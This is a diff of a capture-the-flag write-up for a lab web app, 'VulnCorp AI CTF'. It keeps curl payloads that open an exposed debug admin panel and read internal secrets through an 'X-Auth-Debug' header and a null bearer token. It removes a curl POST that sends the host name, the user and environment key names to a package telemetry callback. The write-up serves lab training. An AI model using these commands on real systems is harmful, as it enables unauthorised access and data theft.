@@ -1,8 +1,8 @@
 # VulnCorp AI CTF
 
 ```
-**Difficulty:** Easy
-**Flags Captured:** 6 / 6
+Difficulty: Easy
+Flags Captured: 6 / 6
 ```
 
 ## Executive Summary
@@ -40,7 +40,6 @@ By navigating to the exposed debug endpoint and passing the URL-encoded secret, 
 **Payload:**
 ```bash
 curl "[http://ctf.ine.local:8080/debug/admin-panel?secret=XXXXXXXXXXXXXXX](http://ctf.ine.local:8080/debug/admin-panel?secret=XXXXXXXXXXXXXXX)"
-
 ```
 
 **Flag 1:** `FLAG{S3CUR1TY_XXXXXXXXXXXXXXXXXXXX}`
@@ -168,17 +167,7 @@ Passing the forged token or the debug header to the internal secrets endpoint by
 
 ```bash
 curl -H "X-Auth-Debug: true" -H "Authorization: Bearer null" [http://ctf.ine.local:8080/api/internal/secrets](http://ctf.ine.local:8080/api/internal/secrets)
-
 ```
-
-```bash
-
-curl -X POST http://ctf.ine.local:4873/callback/telemetry \
-  -H "Content-Type: application/json" \
-  -H "X-Package-Name: vulncorp-utils" \
-  -H "X-Package-Version: 2.1.0" \
-  -d '{"hostname": "kali", "user": "root", "env_keys": ["SUPER_SECRET_KEY"]}'
-  ```
 
 **Flag 6:** `FLAG{FA1L_XXXXXXXXXXXXXXXXXXXXX}`
 
